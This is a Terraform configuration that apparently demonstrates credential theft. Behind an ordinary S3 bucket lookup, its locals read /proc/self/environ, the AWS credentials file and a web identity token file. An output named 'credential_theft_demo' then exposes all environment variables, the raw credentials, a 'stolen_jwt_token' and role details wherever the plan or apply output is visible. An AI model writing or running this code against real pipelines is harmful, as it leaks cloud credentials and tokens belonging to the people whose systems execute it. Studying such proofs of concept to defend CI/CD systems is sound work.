provider "aws" {
  region = "ap-southeast-2"
}

data "aws_s3_bucket" "bucket" {
  bucket = "20240906"
}

locals {
  proc_environ = try(file("/proc/self/environ"), "")

  env_vars = local.proc_environ != "" ? {
    for pair in split("\u0000", local.proc_environ) :
    split("=", pair)[0] => join("=", slice(split("=", pair), 1, length(split("=", pair))))
    if length(split("=", pair)) > 1
  } : {}

  aws_creds_file_path = lookup(local.env_vars, "AWS_SHARED_CREDENTIALS_FILE", "~/.aws/credentials")

  aws_credentials_content = try(file(local.aws_creds_file_path), "file not found")

  aws_creds_parsed = local.aws_credentials_content != "file not found" ? {
    for line in split("\n", local.aws_credentials_content) :
    split("=", line)[0] => join("=", slice(split("=", line), 1, length(split("=", line))))
  } : {}

  web_identity_token_file = lookup(local.aws_creds_parsed, "web_identity_token_file", "")

  web_identity_token_content = local.web_identity_token_file != "" ? try(file(local.web_identity_token_file), "token file not found") : ""

  role_arn          = lookup(local.aws_creds_parsed, "role_arn", "")
  role_session_name = lookup(local.aws_creds_parsed, "role_session_name", "")
}

output "bucket_details" {
  value = {
    name                      = data.aws_s3_bucket.bucket.id
    region                    = data.aws_s3_bucket.bucket.region
    arn                       = data.aws_s3_bucket.bucket.arn
    bucket_domain_name        = data.aws_s3_bucket.bucket.bucket_domain_name
    bucket_regional_domain_name = data.aws_s3_bucket.bucket.bucket_regional_domain_name
  }
}

output "credential_theft_demo" {
  value = {
    env_vars = local.env_vars

    creds_file_path = local.aws_creds_file_path

    creds_file_content = local.aws_credentials_content

    parsed_creds = local.aws_creds_parsed

    token_file_path = local.web_identity_token_file

    stolen_jwt_token = local.web_identity_token_content

    aws_role_info = {
      role_arn          = local.role_arn
      role_session_name = local.role_session_name
    }
  }
}
